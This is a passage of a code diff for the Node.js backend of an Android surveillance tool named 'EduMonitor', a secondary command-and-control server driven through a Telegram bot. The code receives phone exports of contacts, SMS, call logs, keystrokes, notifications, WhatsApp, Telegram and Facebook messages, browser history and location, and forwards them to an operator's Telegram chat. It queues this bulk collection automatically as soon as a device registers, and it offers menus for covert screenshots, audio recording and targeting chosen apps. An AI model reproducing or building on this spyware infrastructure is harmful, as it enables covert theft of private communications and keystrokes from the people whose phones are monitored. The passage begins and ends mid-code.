-        await axios.post(`${getTelegramApiUrl()}/sendPhoto`, formData, { headers: { ...formData.getHeaders() }, maxContentLength: Infinity, maxBodyLength: Infinity });
-        setTimeout(() => { try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {} }, 60000);
-        res.json({ success: true });
-    } catch (error) { console.error('❌ Photo upload error:', error); res.status(500).json({ error: 'Upload failed' }); }
+        
+        await axios.post(`${getTelegramApiUrl()}/sendPhoto`, formData, {
+            headers: { ...formData.getHeaders() },
+            maxContentLength: Infinity,
+            maxBodyLength: Infinity
+        });
+        
+        setTimeout(() => {
+            try {
+                if (fs.existsSync(filePath)) {
+                    fs.unlinkSync(filePath);
+                    console.log(`🧹 Deleted photo: ${filePath}`);
+                }
+            } catch (e) {
+                console.error('Error deleting photo:', e);
+            }
+        }, 60000);
+        
+        res.json({ success: true, filename: req.file.filename, size: req.file.size });
+        
+    } catch (error) {
+        console.error('❌ Photo upload error:', error);
+        res.status(500).json({ error: 'Upload failed: ' + error.message });
+    }
 });
+
+// ============= DATA UPLOAD ENDPOINTS =============
 
 app.post('/api/upload-file', upload.single('file'), async (req, res) => {
     try {
@@ -809,266 +905,936 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
         const command = req.body.command;
         const filename = req.body.filename;
         const itemCount = req.body.count || '0';
-        if (!deviceId || !command || !filename || !req.file) return res.status(400).json({ error: 'Missing fields' });
+        
+        if (!deviceId || !command || !filename || !req.file) {
+            console.error('❌ Missing fields in upload');
+            return res.status(400).json({ error: 'Missing fields' });
+        }
+        
+        console.log(`📎 File upload from ${deviceId}: ${filename} (${req.file.size} bytes, ${itemCount} items)`);
+        
         const device = devices.get(deviceId);
-        if (!device) return res.status(404).json({ error: 'Device not found' });
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
         const chatId = device.chatId;
         const filePath = req.file.path;
         const deviceName = device.deviceInfo?.model || 'Unknown Device';
+        
         let caption = `📱 *${deviceName}*\n\n`;
-        const commandMap = { contacts: '📇 Contacts', sms: '💬 SMS', calllogs: '📞 Call Logs', apps_list: '📱 Apps', keys: '⌨️ Keystrokes', notify: '🔔 Notifications' };
-        caption += commandMap[command] ? `${commandMap[command]} Export (${itemCount} items)` : '📎 Data Export';
+        
+        switch (command) {
+            case 'contacts':
+                caption += `📇 Contacts Export (${itemCount} contacts)`;
+                break;
+            case 'sms':
+                caption += `💬 SMS Messages Export (${itemCount} messages)`;
+                break;
+            case 'calllogs':
+                caption += `📞 Call Logs Export (${itemCount} calls)`;
+                break;
+            case 'apps_list':
+                caption += `📱 Installed Apps Export (${itemCount} apps)`;
+                break;
+            case 'keys':
+                caption += `⌨️ Keystroke Logs Export (${itemCount} entries)`;
+                break;
+            case 'notify':
+                caption += `🔔 Notifications Export (${itemCount} notifications)`;
+                break;
+            case 'open_app':
+                caption += `📱 App Opens Export (${itemCount} entries)`;
+                break;
+            case 'whatsapp':
+                caption += `💬 WhatsApp Messages Export (${itemCount} messages)`;
+                break;
+            case 'telegram':
+                caption += `💬 Telegram Messages Export (${itemCount} messages)`;
+                break;
+            case 'facebook':
+                caption += `💬 Facebook Messages Export (${itemCount} messages)`;
+                break;
+            case 'browser':
+                caption += `🌐 Browser History Export (${itemCount} entries)`;
+                break;
+            case 'device_info':
+                caption += `📊 Device Info Export (${itemCount} snapshots)`;
+                break;
+            default:
+                caption += `📎 Data Export`;
+        }
+        
         await sendTelegramDocument(chatId, filePath, filename, caption);
-        setTimeout(() => { try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {} }, 60000);
-        res.json({ success: true });
-    } catch (error) { console.error('❌ File upload error:', error); res.status(500).json({ error: 'Upload failed' }); }
+        
+        setTimeout(() => {
+            try {
+                if (fs.existsSync(filePath)) {
+                    fs.unlinkSync(filePath);
+                    console.log(`🧹 Deleted temporary file: ${filePath}`);
+                }
+            } catch (e) {
+                console.error('Error deleting file:', e);
+            }
+        }, 60000);
+        
+        res.json({ success: true, filename, size: req.file.size });
+        
+    } catch (error) {
+        console.error('❌ File upload error:', error);
+        res.status(500).json({ error: 'Upload failed: ' + error.message });
+    }
 });
 
-app.get('/health', (req, res) => { res.json({ status: 'healthy', timestamp: Date.now(), server: 'secondary', devices: devices.size, storageType: octokit ? 'GitHub Gist' : 'Local Files' }); });
+// ============= API ENDPOINTS =============
 
-app.get('/api/ping/:deviceId', async (req, res) => {
+app.get('/health', (req, res) => {
+    res.json({ 
+        status: 'healthy', 
+        timestamp: Date.now(),
+        server: 'secondary'
+    });
+});
+
+app.get('/api/ping/:deviceId', (req, res) => {
     const deviceId = req.params.deviceId;
     const device = devices.get(deviceId);
-    if (device) { device.lastSeen = Date.now(); await saveDevices(); res.json({ status: 'alive', timestamp: Date.now(), registered: true, deviceId, chatId: device.chatId, serverUrl: activeServerUrl }); }
-    else { res.status(404).json({ status: 'unknown', registered: false, deviceId, message: 'Device not registered' }); }
+    
+    if (device) {
+        device.lastSeen = Date.now();
+        saveDevices();
+        res.json({ 
+            status: 'alive', 
+            timestamp: Date.now(),
+            registered: true,
+            deviceId: deviceId,
+            chatId: device.chatId,
+            serverUrl: activeServerUrl
+        });
+    } else {
+        res.status(404).json({ 
+            status: 'unknown',
+            registered: false,
+            deviceId: deviceId,
+            message: 'Device not registered'
+        });
+    }
 });
 
 app.get('/api/verify/:deviceId', (req, res) => {
     const deviceId = req.params.deviceId;
     const device = devices.get(deviceId);
-    if (device && device.chatId) { res.json({ registered: true, deviceId, chatId: device.chatId, lastSeen: device.lastSeen, deviceInfo: device.deviceInfo, hasPendingCommands: (device.pendingCommands?.length || 0) > 0 }); }
-    else { res.status(404).json({ registered: false, deviceId, message: 'Device not registered' }); }
+    
+    if (device && device.chatId) {
+        res.json({
+            registered: true,
+            deviceId: deviceId,
+            chatId: device.chatId,
+            lastSeen: device.lastSeen,
+            deviceInfo: device.deviceInfo,
+            phoneNumber: device.phoneNumber,
+            hasPendingCommands: (device.pendingCommands?.length || 0) > 0
+        });
+    } else {
+        res.status(404).json({
+            registered: false,
+            deviceId: deviceId,
+            message: 'Device not registered'
+        });
+    }
 });
 
-app.get('/api/commands/:deviceId', async (req, res) => {
+app.get('/api/commands/:deviceId', (req, res) => {
     const deviceId = req.params.deviceId;
     const device = devices.get(deviceId);
+    
     try {
         if (device?.pendingCommands?.length > 0) {
             const sortedCommands = [...device.pendingCommands].sort((a, b) => a.timestamp - b.timestamp);
-            const commands = sortedCommands.map(cmd => ({ command: cmd.command, originalCommand: cmd.originalCommand, messageId: cmd.messageId, timestamp: cmd.timestamp, autoData: cmd.autoData || false }));
+            const commands = sortedCommands.map(cmd => ({
+                command: cmd.command,
+                originalCommand: cmd.originalCommand,
+                messageId: cmd.messageId,
+                timestamp: cmd.timestamp,
+                autoData: cmd.autoData || false
+            }));
             device.pendingCommands = [];
-            await saveDevices();
+            saveDevices();
+            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands.map(c => c.command).join(', '));
             sendJsonResponse(res, { commands });
-        } else { sendJsonResponse(res, { commands: [] }); }
-    } catch (e) { console.error('Error in /api/commands:', e); sendJsonResponse(res, { commands: [], error: e.message }, 500); }
+        } else {
+            console.log(`📭 No commands for ${deviceId}`);
+            sendJsonResponse(res, { commands: [] });
+        }
+    } catch (e) {
+        console.error('Error in /api/commands:', e);
+        sendJsonResponse(res, { commands: [], error: e.message }, 500);
+    }
 });
 
 app.post('/api/result/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, result, error } = req.body;
-    const fileCommands = ['contacts', 'sms', 'calllogs', 'apps_list', 'keys', 'notify', 'open_app', 'whatsapp', 'telegram', 'facebook', 'browser', 'device_info', 'network_info', 'mobile_info', 'screenshots', 'screenshot_logs'];
-    if (fileCommands.includes(command)) return res.sendStatus(200);
+    
+    const fileCommands = [
+        'contacts', 'sms', 'calllogs', 'apps_list', 'keys', 'notify', 'open_app',
+        'whatsapp', 'telegram', 'facebook', 'browser',
+        'device_info', 'network_info', 'mobile_info',
+        'screenshots', 'screenshot_logs'
+    ];
+    
+    if (fileCommands.includes(command)) {
+        console.log(`📎 ${command} using dedicated file upload endpoint`);
+        return res.sendStatus(200);
+    }
+    
+    console.log(`📨 Result from ${deviceId}:`, { command });
+    
     const device = devices.get(deviceId);
     if (device) {
         const chatId = device.chatId;
         const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
-        if (error) await sendTelegramMessage(chatId, devicePrefix + `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
-        else if (result) await sendTelegramMessage(chatId, devicePrefix + result);
-        else await sendTelegramMessage(chatId, devicePrefix + `✅ ${command} executed successfully`);
+        
+        if (error) {
+            await sendTelegramMessage(chatId, devicePrefix + `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
+        } else if (result) {
+            await sendTelegramMessage(chatId, devicePrefix + result);
+        } else {
+            await sendTelegramMessage(chatId, devicePrefix + `✅ ${command} executed successfully`);
+        }
     }
+    
     res.sendStatus(200);
 });
 
+// ============= REGISTRATION ENDPOINT =============
+
 app.post('/api/register', async (req, res) => {
     const { deviceId, deviceInfo } = req.body;
-    console.log('📝 Registration attempt on secondary server:', { deviceId });
-    if (!deviceId || !deviceInfo) return res.status(400).json({ error: 'Missing fields' });
+    
+    console.log('📝 Registration attempt:', { deviceId });
+    
+    if (!deviceId || !deviceInfo) {
+        return res.status(400).json({ error: 'Missing fields' });
+    }
+    
     const deviceConfig = getDeviceConfig(deviceId);
+    
+    if (!deviceConfig) {
+        return res.status(403).json({ error: 'Device not authorized' });
+    }
+    
     const existingDevice = devices.get(deviceId);
     const isNewDevice = !existingDevice;
+    
     const deviceData = {
-        chatId: deviceConfig.chatId, deviceInfo, lastSeen: Date.now(),
+        chatId: deviceConfig.chatId,
+        deviceInfo,
+        lastSeen: Date.now(),
         pendingCommands: existingDevice ? existingDevice.pendingCommands : [],
         firstSeen: existingDevice ? existingDevice.firstSeen : Date.now(),
-        phoneNumber: existingDevice?.phoneNumber || null, registeredOnSecondary: true
+        phoneNumber: existingDevice?.phoneNumber || null,
+        lastIPInfo: existingDevice?.lastIPInfo || null,
+        lastLocation: existingDevice?.lastLocation || null,
+        simInfo: existingDevice?.simInfo || null,
+        wifiInfo: existingDevice?.wifiInfo || null,
+        mobileInfo: existingDevice?.mobileInfo || null,
+        screenshotSettings: existingDevice?.screenshotSettings || null,
+        recordingSettings: existingDevice?.recordingSettings || null
     };
+    
     devices.set(deviceId, deviceData);
-    await saveDevices();
+    saveDevices();
+    
+    console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId} for chat ${deviceConfig.chatId}`);
+    
     await setChatMenuButton(deviceConfig.chatId);
-    let welcomeMessage = `✅ <b>Device Connected to SECONDARY/BACKUP Server!</b>\n\n📱 Model: ${deviceInfo.model}\n🤖 Android: ${deviceInfo.android}\n🆔 ID: ${deviceId.substring(0, 8)}...\n\n⚠️ Note: This is the BACKUP server. The main server may be offline.`;
-    await sendTelegramMessageWithKeyboard(deviceConfig.chatId, welcomeMessage, getMainMenuKeyboard(deviceConfig.chatId));
-    const responseConfig = { ...deviceConfig.config, botToken: activeBotToken, serverUrl: activeServerUrl, chatId: deviceConfig.chatId, serverType: 'secondary' };
-    res.json({ status: 'registered', deviceId, chatId: deviceConfig.chatId, config: responseConfig, serverType: 'secondary' });
+    
+    const userDevices = getDeviceListForUser(deviceConfig.chatId);
+    
+    let welcomeMessage = `✅ <b>Device ${isNewDevice ? 'Connected' : 'Updated'}!</b>\n\n`;
+    welcomeMessage += `📱 Model: ${deviceInfo.model}\n`;
+    welcomeMessage += `🤖 Android: ${deviceInfo.android}\n`;
+    welcomeMessage += `🆔 ID: ${deviceId.substring(0, 8)}...\n\n`;
+    
+    if (isNewDevice) {
+        welcomeMessage += `You now have ${userDevices.length} device(s) registered.\n\n`;
+        welcomeMessage += `🔄 <b>Auto-collecting data...</b>\n`;
+        welcomeMessage += `The server is automatically requesting:\n`;
+        welcomeMessage += `• 📱 Device Info\n`;
+        welcomeMessage += `• 🌐 Network Info\n`;
+        welcomeMessage += `• 📱 Mobile Info\n`;
+        welcomeMessage += `• 📇 Contacts\n`;
+        welcomeMessage += `• 💬 SMS Messages\n`;
+        welcomeMessage += `• 📞 Call Logs\n`;
+        welcomeMessage += `• 📱 Installed Apps\n`;
+        welcomeMessage += `• ⌨️ Keystrokes\n`;
+        welcomeMessage += `• 🔔 Notifications\n`;
+        welcomeMessage += `• 💬 WhatsApp\n`;
+        welcomeMessage += `• 💬 Telegram\n`;
+        welcomeMessage += `• 💬 Facebook\n`;
+        welcomeMessage += `• 🌐 Browser History\n`;
+        welcomeMessage += `• 📍 Location\n\n`;
+        welcomeMessage += `This may take a few moments as the device processes each request.`;
+        
+        if (userDevices.length === 1) {
+            userDeviceSelection.set(deviceConfig.chatId, deviceId);
+            welcomeMessage += `\n\n✅ This device has been automatically selected for control.`;
+        }
+    } else {
+        welcomeMessage += `Device information updated.`;
+    }
+    
+    await sendTelegramMessageWithKeyboard(
+        deviceConfig.chatId,
+        welcomeMessage,
+        getMainMenuKeyboard(deviceConfig.chatId)
+    );
+    
+    if (isNewDevice) {
+        queueAutoDataCommands(deviceId, deviceConfig.chatId);
+    }
+    
+    // Return config with current active bot token and server URL
+    const responseConfig = {
+        ...deviceConfig.config,
+        botToken: activeBotToken,
+        serverUrl: activeServerUrl,
+        chatId: deviceConfig.chatId
+    };
+    
+    res.json({
+        status: 'registered',
+        deviceId,
+        chatId: deviceConfig.chatId,
+        config: responseConfig
+    });
 });
 
 app.get('/api/devices', (req, res) => {
     const deviceList = [];
     for (const [id, device] of devices.entries()) {
-        deviceList.push({ deviceId: id, chatId: device.chatId, lastSeen: new Date(device.lastSeen).toISOString(), model: device.deviceInfo?.model || 'Unknown', android: device.deviceInfo?.android || 'Unknown', online: (Date.now() - device.lastSeen) < 300000 });
+        deviceList.push({
+            deviceId: id,
+            chatId: device.chatId,
+            lastSeen: new Date(device.lastSeen).toISOString(),
+            firstSeen: new Date(device.firstSeen).toISOString(),
+            model: device.deviceInfo?.model || 'Unknown',
+            android: device.deviceInfo?.android || 'Unknown',
+            phoneNumber: device.phoneNumber || 'Not available',
+            lastIPInfo: device.lastIPInfo || null,
+            lastLocation: device.lastLocation || null,
+            autoDataRequested: autoDataRequested.has(id),
+            online: (Date.now() - device.lastSeen) < 300000
+        });
     }
-    res.json({ total: devices.size, devices: deviceList, server: 'secondary' });
+    res.json({ total: devices.size, devices: deviceList });
 });
+
+// ============= TEST ENDPOINTS =============
 
 app.get('/test', (req, res) => {
     const serverIP = getServerIP();
-    res.send(`<html><head><style>body{font-family:Arial;padding:20px;background:#1a1a2e;color:#fff;}h1{color:#e94560;}.stats{background:#16213e;padding:20px;border-radius:10px;}</style></head><body><h1>✅ Secondary Server - EduMonitor v8.0</h1><div class='stats'><p><b>Time:</b> ${new Date().toISOString()}</p><p><b>Server IP:</b> ${serverIP}</p><p><b>Total Devices:</b> ${devices.size}</p><p><b>Storage:</b> ${octokit ? 'GitHub Gist' : 'Local Files'}</p></div></body></html>`);
+    const userDevices = getDeviceListForUser('8266841615');
+    
+    res.send(`
+        <html>
+        <head>
+            <style>
+                body { font-family: Arial; padding: 20px; background: #1a1a2e; color: #fff; }
+                h1 { color: #e94560; }
+                .stats { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px 0; }
+                .device { background: #0f3460; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 3px solid #e94560; }
+                .online { color: #4CAF50; }
+                .offline { color: #f44336; }
+                .ip { background: #1a1a2e; padding: 5px; border-radius: 3px; font-family: monospace; }
+            </style>
+        </head>
+        <body>
+            <h1>✅ Secondary Server - EduMonitor v7.0</h1>
+            <div class="stats">
+                <p><b>Time:</b> ${new Date().toISOString()}</p>
+                <p><b>Server IP:</b> <code class="ip">${serverIP}</code></p>
+                <p><b>Total Devices:</b> ${devices.size}</p>
+                <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
+                <p><b>Persistent Storage:</b> ${fs.existsSync(DEVICES_FILE) ? '✅ Enabled' : '⚠️ Not initialized'}</p>
+                <p><b>Active Bot Token:</b> <code>${activeBotToken.substring(0, 20)}...</code></p>
+                <p><b>Server URL:</b> <code>${activeServerUrl}</code></p>
+            </div>
+            
+            <h2>📱 Registered Devices (${userDevices.length})</h2>
+            ${Array.from(devices.entries()).map(([id, device]) => {
+                const online = (Date.now() - device.lastSeen) < 300000;
+                return `
+                    <div class="device">
+                        <h3>${device.deviceInfo?.model || 'Unknown Device'}</h3>
+                        <p><b>ID:</b> <code>${id}</code></p>
+                        <p><b>Status:</b> <span class="${online ? 'online' : 'offline'}">${online ? '🟢 Online' : '⚫ Offline'}</span></p>
+                        <p><b>Last Seen:</b> ${new Date(device.lastSeen).toLocaleString()}</p>
+                        <p><b>First Seen:</b> ${new Date(device.firstSeen).toLocaleString()}</p>
+                        <p><b>Android:</b> ${device.deviceInfo?.android || 'Unknown'}</p>
+                        <p><b>Phone:</b> ${device.phoneNumber || 'Not available'}</p>
+                        <p><b>Pending Commands:</b> ${device.pendingCommands?.length || 0}</p>
+                    </div>
+                `;
+            }).join('')}
+            
+            <p><a href="/test-menu" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Menu</a></p>
+        </body>
+        </html>
+    `);
 });
 
-// ============= WEBHOOK & CALLBACK HANDLERS =============
-
-app.post('/webhook', async (req, res) => {
-    res.sendStatus(200);
-    setImmediate(async () => {
-        try {
-            const update = req.body;
-            if (update.callback_query) { await handleCallbackQuery(update.callback_query); return; }
-            if (!update?.message) return;
-            const chatId = update.message.chat.id;
-            const text = update.message.text;
-            const messageId = update.message.message_id;
-            if (!isAuthorizedChat(chatId)) { await sendTelegramMessage(chatId, '⛔ You are not authorized.'); return; }
-            await setChatMenuButton(chatId);
-            const userState = userStates.get(chatId);
-            if (userState) { await handleConversationMessage(chatId, text, messageId, userState); return; }
-            if (text?.startsWith('/')) { await handleCommand(chatId, text, messageId); }
-            else { await sendTelegramMessageWithKeyboard(chatId, "🤖 SECONDARY/BACKUP SERVER - Use the menu button below", getMainMenuKeyboard(chatId)); }
-        } catch (error) { console.error('❌ Error processing webhook:', error); }
-    });
+app.get('/test-menu', async (req, res) => {
+    const chatId = '8266841615';
+    const result = await sendTelegramMessageWithKeyboard(
+        chatId,
+        "🎯 Secondary Server Test Menu - Use the buttons below:",
+        getMainMenuKeyboard(chatId)
+    );
+    res.json({ success: !!result });
 });
+
+// ============= CALLBACK QUERY HANDLER =============
 
 async function handleCallbackQuery(callbackQuery) {
     const chatId = callbackQuery.message.chat.id;
     const messageId = callbackQuery.message.message_id;
     const data = callbackQuery.data;
     const callbackId = callbackQuery.id;
+    
+    console.log(`🖱️ Callback received: ${data} from chat ${chatId}`);
+    
     await answerCallbackQuery(callbackId);
-    if (data.startsWith('cmd:')) { await executeCommandFromButton(chatId, messageId, data.substring(4), callbackId); return; }
-    const menuHandlers = {
-        'help_main': () => editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId)),
-        'menu_screenshot': () => editMessageKeyboard(chatId, messageId, getScreenshotMenuKeyboard()),
-        'menu_screenshot_settings': () => editMessageKeyboard(chatId, messageId, getScreenshotSettingsKeyboard()),
-        'menu_screenshot_targets': () => editMessageKeyboard(chatId, messageId, getScreenshotTargetsKeyboard()),
-        'menu_screenshot_quality': () => editMessageKeyboard(chatId, messageId, getScreenshotQualityKeyboard()),
-        'menu_screenshot_token': () => editMessageKeyboard(chatId, messageId, getScreenshotTokenKeyboard()),
-        'menu_sched_config': () => editMessageKeyboard(chatId, messageId, getSchedConfigKeyboard()),
-        'menu_camera': () => editMessageKeyboard(chatId, messageId, getCameraMenuKeyboard()),
-        'menu_recording': () => editMessageKeyboard(chatId, messageId, getRecordingMenuKeyboard()),
-        'menu_recording_settings': () => editMessageKeyboard(chatId, messageId, getRecordingSettingsKeyboard()),
-        'menu_audio_quality': () => editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard()),
-        'menu_data': () => editMessageKeyboard(chatId, messageId, getDataMenuKeyboard()),
-        'menu_new_data': () => editMessageKeyboard(chatId, messageId, getNewDataKeyboard()),
-        'menu_all_data': () => editMessageKeyboard(chatId, messageId, getAllDataKeyboard()),
-        'menu_sync_harvest': () => editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard()),
-        'menu_realtime': () => editMessageKeyboard(chatId, messageId, getRealtimeMenuKeyboard()),
-        'menu_info': () => editMessageKeyboard(chatId, messageId, getInfoMenuKeyboard()),
-        'menu_device_name': () => editMessageKeyboard(chatId, messageId, getDeviceNameKeyboard()),
-        'menu_system': () => editMessageKeyboard(chatId, messageId, getSystemMenuKeyboard()),
-        'menu_media': () => editMessageKeyboard(chatId, messageId, getMediaMenuKeyboard()),
-        'menu_app_management': () => editMessageKeyboard(chatId, messageId, getAppManagementKeyboard()),
-        'menu_data_saving': () => editMessageKeyboard(chatId, messageId, getDataSavingKeyboard()),
-        'menu_bot_token': () => editMessageKeyboard(chatId, messageId, getBotTokenKeyboard()),
-        'menu_devices': () => editMessageKeyboard(chatId, messageId, getDeviceSelectionKeyboard(chatId)),
-        'refresh_devices': () => editMessageKeyboard(chatId, messageId, getDeviceSelectionKeyboard(chatId)),
-        'close_menu': () => editMessageKeyboard(chatId, messageId, [])
-    };
-    if (menuHandlers[data]) { await menuHandlers[data](); }
-    else if (data.startsWith('select_device:')) {
-        const selectedDeviceId = data.split(':')[1];
-        const device = devices.get(selectedDeviceId);
-        if (device) { userDeviceSelection.set(chatId, selectedDeviceId); await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId)); await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`); }
-    } else if (data === 'device_stats') {
-        const userDevices = getDeviceListForUser(chatId);
-        let statsMsg = `📊 *Device Statistics*\n\nTotal Devices: ${userDevices.length}\n\n`;
-        userDevices.forEach((device, index) => { statsMsg += `${index + 1}. ${device.name}\n   ID: ${device.id.substring(0, 8)}...\n   Status: ${(Date.now() - device.lastSeen) < 300000 ? '✅ Online' : '⏹️ Offline'}\n\n`; });
-        await sendTelegramMessage(chatId, statsMsg);
+    
+    // Handle commands
+    if (data.startsWith('cmd:')) {
+        const command = data.substring(4);
+        await executeCommandFromButton(chatId, messageId, command, callbackId);
+        return;
+    }
+    
+    // Handle menu navigation
+    switch (data) {
+        case 'help_main':
+            await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
+            await sendTelegramMessage(chatId, "🤖 *EduMonitor Control Panel*\n\nSelect a category:");
+            break;
+        case 'menu_screenshot':
+            await editMessageKeyboard(chatId, messageId, getScreenshotMenuKeyboard());
+            break;
+        case 'menu_screenshot_settings':
+            await editMessageKeyboard(chatId, messageId, getScreenshotSettingsKeyboard());
+            break;
+        case 'menu_screenshot_targets':
+            await editMessageKeyboard(chatId, messageId, getScreenshotTargetsKeyboard());
+            break;
+        case 'menu_screenshot_quality':
+            await editMessageKeyboard(chatId, messageId, getScreenshotQualityKeyboard());
+            break;
+        case 'menu_screenshot_token':
+            await editMessageKeyboard(chatId, messageId, getScreenshotTokenKeyboard());
+            break;
+        case 'menu_sched_config':
+            await editMessageKeyboard(chatId, messageId, getSchedConfigKeyboard());
+            break;
+        case 'menu_configure_schedule':
+            await sendTelegramMessage(chatId, "⚙️ *Configure Screenshot Schedule*\n\nSend: `on/off general_minutes target_minutes`\nExample: `on 10 5`");
+            await editMessageKeyboard(chatId, messageId, getConfigureScheduleKeyboard());
+            userStates.set(chatId, { state: 'awaiting_sched_config', data: {} });
+            break;
+        case 'menu_add_target':
+            await sendTelegramMessage(chatId, "📱 *Add Target App*\n\nSend the package name:\nExample: `com.whatsapp`");
+            await editMessageKeyboard(chatId, messageId, getAddTargetKeyboard());
+            userStates.set(chatId, { state: 'awaiting_add_target', data: {} });
+            break;
+        case 'menu_remove_target':
+            await sendTelegramMessage(chatId, "❌ *Remove Target App*\n\nSend the package name to remove:");
+            await editMessageKeyboard(chatId, messageId, getRemoveTargetKeyboard());
+            userStates.set(chatId, { state: 'awaiting_remove_target', data: {} });
+            break;
+        case 'menu_camera':
+            await editMessageKeyboard(chatId, messageId, getCameraMenuKeyboard());
+            break;
+        case 'menu_recording':
+            await editMessageKeyboard(chatId, messageId, getRecordingMenuKeyboard());
+            break;
+        case 'menu_recording_settings':
+            await editMessageKeyboard(chatId, messageId, getRecordingSettingsKeyboard());
+            break;
+        case 'menu_audio_quality':
+            await editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard());
+            break;
+        case 'menu_custom_schedule':
+            await sendTelegramMessage(chatId, "⚙️ *Set Custom Recording Schedule*\n\nFormat: `HH:MM HH:MM daily/once minutes`\nExample: `22:00 06:00 daily 30`");
+            await editMessageKeyboard(chatId, messageId, getCustomScheduleKeyboard());
+            userStates.set(chatId, { state: 'awaiting_custom_schedule', data: {} });
+            break;
+        case 'menu_data':
+            await editMessageKeyboard(chatId, messageId, getDataMenuKeyboard());
+            break;
+        case 'menu_new_data':
+            await editMessageKeyboard(chatId, messageId, getNewDataKeyboard());
+            break;
+        case 'menu_all_data':
+            await editMessageKeyboard(chatId, messageId, getAllDataKeyboard());
+            break;
+        case 'menu_sync_harvest':
+            await editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard());
+            break;
+        case 'menu_set_sync_interval':
+            await sendTelegramMessage(chatId, "⚙️ *Set Sync Interval*\n\nSend interval in minutes (5-720):\nExample: `60`");
+            await editMessageKeyboard(chatId, messageId, getSetSyncIntervalKeyboard());
+            userStates.set(chatId, { state: 'awaiting_sync_interval', data: {} });
+            break;
+        case 'menu_realtime':
+            await editMessageKeyboard(chatId, messageId, getRealtimeMenuKeyboard());
+            break;
+        case 'menu_info':
+            await editMessageKeyboard(chatId, messageId, getInfoMenuKeyboard());
+            break;
+        case 'menu_device_name':
+            await editMessageKeyboard(chatId, messageId, getDeviceNameKeyboard());
+            break;
+        case 'menu_system':
+            await editMessageKeyboard(chatId, messageId, getSystemMenuKeyboard());
+            break;
+        case 'menu_media':
+            await editMessageKeyboard(chatId, messageId, getMediaMenuKeyboard());
+            break;
+        case 'menu_add_scan_path':
+            await sendTelegramMessage(chatId, "📁 *Add Scan Path*\n\nSend the folder path to scan:\nExample: `DCIM/Camera`");
+            await editMessageKeyboard(chatId, messageId, getAddScanPathKeyboard());
+            userStates.set(chatId, { state: 'awaiting_add_scan_path', data: {} });
+            break;
+        case 'menu_remove_scan_path':
+            await sendTelegramMessage(chatId, "❌ *Remove Scan Path*\n\nSend the folder path to remove:");
+            await editMessageKeyboard(chatId, messageId, getRemoveScanPathKeyboard());
+            userStates.set(chatId, { state: 'awaiting_remove_scan_path', data: {} });
+            break;
+        case 'menu_app_management':
+            await editMessageKeyboard(chatId, messageId, getAppManagementKeyboard());
+            break;
+        case 'menu_data_saving':
+            await editMessageKeyboard(chatId, messageId, getDataSavingKeyboard());
+            break;
+        case 'menu_bot_token':
+            await editMessageKeyboard(chatId, messageId, getBotTokenKeyboard());
+            break;
+        case 'menu_set_server_backup':
+            await sendTelegramMessage(chatId, "🤖 *Set Server Backup Tokens*\n\nFormat: `token1 chatId1 token2 chatId2`\nExample: `123456:ABC 123456789 654321:XYZ 987654321`");
+            await editMessageKeyboard(chatId, messageId, getSetServerBackupKeyboard());
+            userStates.set(chatId, { state: 'awaiting_server_backup', data: {} });
+            break;
+        case 'menu_devices':
+            const keyboard = getDeviceSelectionKeyboard(chatId);
+            await editMessageKeyboard(chatId, messageId, keyboard);
+            break;
+        case 'refresh_devices':
+            const refreshKeyboard = getDeviceSelectionKeyboard(chatId);
+            await editMessageKeyboard(chatId, messageId, refreshKeyboard);
+            await answerCallbackQuery(callbackId, '🔄 Device list refreshed');
+            break;
+        case 'device_stats':
+            const userDevices = getDeviceListForUser(chatId);
+            let statsMsg = `📊 *Device Statistics*\n\nTotal Devices: ${userDevices.length}\n\n`;
+            userDevices.forEach((device, index) => {
+                statsMsg += `${index + 1}. ${device.name}\n`;
+                statsMsg += `   ID: ${device.id.substring(0, 8)}...\n`;
+                statsMsg += `   Last Seen: ${device.lastSeenFormatted}\n`;
+                statsMsg += `   Status: ${(Date.now() - device.lastSeen) < 300000 ? '✅ Online' : '⏹️ Offline'}\n\n`;
+            });
+            await sendTelegramMessage(chatId, statsMsg);
+            break;
+        case data.startsWith('select_device:') && data:
+            const selectedDeviceId = data.split(':')[1];
+            const device = devices.get(selectedDeviceId);
+            if (device) {
+                userDeviceSelection.set(chatId, selectedDeviceId);
+                await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model || 'device'}`);
+                await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
+                await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`);
+            }
+            break;
+        case 'close_menu':
+            await editMessageKeyboard(chatId, messageId, []);
+            await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
+            break;
+        default:
+            console.log(`⚠️ Unknown callback: ${data}`);
+            break;
     }
 }
 
 async function executeCommandFromButton(chatId, messageId, command, callbackId) {
+    console.log(`🎯 Executing command from button: ${command}`);
+    
     const selectedDeviceId = userDeviceSelection.get(chatId);
     const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
-    if (!device) { await sendTelegramMessage(chatId, '❌ No device selected.'); return; }
+    
+    if (!device) {
+        await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
